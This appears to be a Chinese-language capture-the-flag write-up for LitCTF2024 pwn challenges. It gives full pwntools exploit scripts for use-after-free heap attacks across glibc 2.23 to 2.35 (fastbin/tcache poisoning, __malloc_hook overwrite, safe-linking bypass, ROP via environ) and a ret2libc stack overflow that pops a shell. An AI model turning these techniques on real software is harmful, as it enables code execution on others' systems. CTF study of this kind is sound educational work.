---
title: LitCTF2024-wp
date: 2024-06-03 00:43:27
category: wp
tags:
---
# Pwn
## heap-2.23
### 思路

glibc2.23，没有tcache，delete函数中有个UAF漏洞

1. 利用unsorted bin 泄露libc基址
2. 修改释放到fastbin的堆块的fd指针，利用错位出0x7f绕过fastbin的分配检测，使堆分配到`__malloc_hook`附近，覆盖 `__malloc_hook`为one_gadget
3. 执行malloc获取shell

### exp
```python
from pwn import *

context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")
#p = remote("node3.anna.nssctf.cn",28132)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
	p.sendlineafter(b">>",b'1')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
	p.sendlineafter(b">>",b'2')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def show(index):
	p.sendlineafter(b">>",b'3')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def edit(index,content):
	p.sendlineafter(b">>",b'4')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'content : ',content)


# leak libc_base
create(0,0x200)
create(1,0x10)
delete(0)
show(0)

p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 3951480
log.success(hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + 0xf1247

create(2,0x68)
create(3,0x68)
delete(2)
edit(2,p64(malloc_hook-0x23))

create(4,0x68)
create(5,0x68)

edit(5,b'a'*0x13+p64(one_gadget))

#gdb.attach(p)

create(6,0x10)

p.interactive()
```



## heap-2.27
### 思路

glibc2.27，有tcache了，还是一样的程序
思路和2.23差不多,不过要注意tcache的next指针指向的不是chunk头的位置，而是用户内存的位置，此外甚至没有任何保护，比2.23还简单

1. 利用unsorted bin 泄露libc基址
2. 修改释放到tcache的堆块的next指针，使堆分配到`__malloc_hook`附近，覆盖 `__malloc_hook`为one_gadget
3. 执行malloc获取shell

### exp

```python
from pwn import *

context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")
#p = remote("node1.anna.nssctf.cn",28695)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
	p.sendlineafter(b">>",b'1')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
	p.sendlineafter(b">>",b'2')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def show(index):
	p.sendlineafter(b">>",b'3')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def edit(index,content):
	p.sendlineafter(b">>",b'4')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'content : ',content)

# gadget
one_gadget_l = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]

# leak libc_base
create(0,0x1000)
create(1,0x10)
delete(0)
show(0)

p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 4111520 
log.success("libc_base: " + hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + one_gadget_l[3]

create(2,0x68)
delete(2)
edit(2,p64(malloc_hook))

create(3,0x68)
create(4,0x68)

edit(4,p64(one_gadget))
create(5,0x10)

p.interactive()
```

## heap-2.31

### 思路

glibc2.31，tcache加了个count检测，只要多释放一个堆块就好

1. 利用unsorted bin 泄露libc基址
2. 修改释放到tcache的堆块的next指针，使堆分配到`__malloc_hook`附近，覆盖 `__malloc_hook`为one_gadget
3. 执行malloc获取shell

### exp

```python
from pwn import *

context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")
#p = remote("node2.anna.nssctf.cn",28596)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
	p.sendlineafter(b">>",b'1')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
	p.sendlineafter(b">>",b'2')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def show(index):
	p.sendlineafter(b">>",b'3')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def edit(index,content):
	p.sendlineafter(b">>",b'4')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'content : ',content)

# gadget
one_gadget1 = 0xe3afe
one_gadget2 = 0xe3b01 
one_gadget3 = 0xe3b04

# leak libc_base
create(0,0x1000)
create(1,0x10)
delete(0)
show(0)

p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 2018272
log.success("libc_base: " + hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + one_gadget2

create(2,0x68)
create(3,0x68)
delete(3)
delete(2)
edit(2,p64(malloc_hook))

create(4,0x68)
create(5,0x68)

edit(5,p64(one_gadget))
create(6,0x10)

p.interactive()
```

## heap-2.35
### 思路

glibc2.35，tcache的next指针指向经PROTECT_PTR处理的指针，并且加了内存对齐检测
取消了hook机制，虽然libc中仍然有这些符号，但已经没有作用了
- __free_hook
- __malloc_hook
- __realloc_hook
- __memalign_hook
- __after_morecore_hook

1. 利用unsorted bin 泄露libc基址
2. 利用tcache的PROTECT_PTR机制泄露堆地址，调试计算heap基址
3. 利用environ泄露栈地址
这里想直接覆盖到edit函数的返回地址的，但是由于内存对齐，只能覆盖到rbp。往上是canary，往下覆盖不到返回地址
但create函数栈帧和edit函数相同，覆盖到rbp又会导致create函数创建堆时将返回地址当成tcache key从而置为0
4. 利用栈泄露ptr地址
5. 将堆分配到ptr上，修改某个堆块的指针，修改为edit返回地址的地址
6. 然后写个rop的链子，成功getshell

### exp
```python
from pwn import *

#context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
        p.sendlineafter(b">>",b'1')
        p.sendlineafter(b'idx? ',str(index).encode())
        p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
        p.sendlineafter(b">>",b'2')
        p.sendlineafter(b'idx? ',str(index).encode())

def show(index):
        p.sendlineafter(b">>",b'3')
        p.sendlineafter(b'idx? ',str(index).encode())

def edit(index,content):
        p.sendlineafter(b">>",b'4')
        p.sendlineafter(b'idx? ',str(index).encode())
        p.sendlineafter(b'content : ',content)

# leak libc_base
create(0,0x1000)
create(1,0x10)
delete(0)
show(0)
p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 2206944
log.success("libc_base: " + hex(libc_base))

# leak heap_base
delete(1)
show(1)
p.recvuntil(b'content : ')
leak = u64(p.recv(5).ljust(8,b'\x00'))
heap_base = (leak<<12)-0x1000
log.success("heap_base : " + hex(heap_base))

environ = libc_base + libc.sym['environ']
pop_rdi = libc_base + 0x2a3e5
ret = libc_base + 0x2a3e6
system_addr = libc_base + libc.sym['system'] 
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

create(2,0x60)
create(3,0x60)
delete(3)
delete(2)
edit(2,p64(environ^((heap_base+0x2a0)>>12)))

# leak stack
create(4,0x60)
create(5,0x60)
show(5)
p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
stack_addr = leak-0x128
log.success('stack_addr : '+hex(stack_addr))

create(6,0x90)
create(7,0x90)
delete(7)
delete(6)
edit(6,p64(stack_addr^((heap_base+0x000380)>>12)))

# leak ptr
create(8,0x90)
create(9,0x90)
payload = cyclic(0x18)
edit(9,payload)
show(9)
p.recvuntil(b'content : ')
leak = u64(p.recv(0x18+6)[-6:].ljust(8,b'\x00'))
ptr = leak + 0x002956 
log.success('ptr : ' + hex(ptr))

create(10,0xa0)
create(11,0xa0)
delete(11)
delete(10)
edit(10, p64(ptr^((heap_base+0x4c0)>>12)))

create(12,0xa0)
create(13,0xa0)

target = stack_addr - 0x18
edit(13,p64(target))
log.info('target : ' + hex(target))

edit(0,p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr))

p.interactive()
```

## heap-2.39


## ATM
### 思路

栈题，先用函数3扩展能写的字节数，在执行函数5，最后用函数4返回

printf函数地址都给了，直接ret2libc

### exp

```python
from pwn import *

context.log_level = 'debug'

#p = process("./app")
p = remote("node2.anna.nssctf.cn",28166)
elf = ELF("./app")

p.recvuntil(b'password:')
p.sendline(b'aaaaaa')

p.recvuntil(b'4.Exit\n')
p.sendline(b'3')

p.recvuntil(b'deposit:')
p.send(b'1111111')

p.recvuntil(b'4.Exit\n')
p.sendline(b'5')

p.recvuntil(b'gift:')
printf_addr = int(p.recv(18),16)

printf_offset = 0x064770
system_offset = 0x054d60
binsh_offset = 0x1dc698

libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset
binsh = libc_base + binsh_offset

log.success("libc_base: " + hex(libc_base) )

pop_rdi = 0x401233
ret = 0x401234

payload = b'a'*360 + p64(pop_rdi) + p64(binsh)+ p64(ret) + p64(system_addr)  
p.sendline(payload)

p.recvuntil(b'4.Exit\n')
p.sendline(b'4')

p.interactive()
```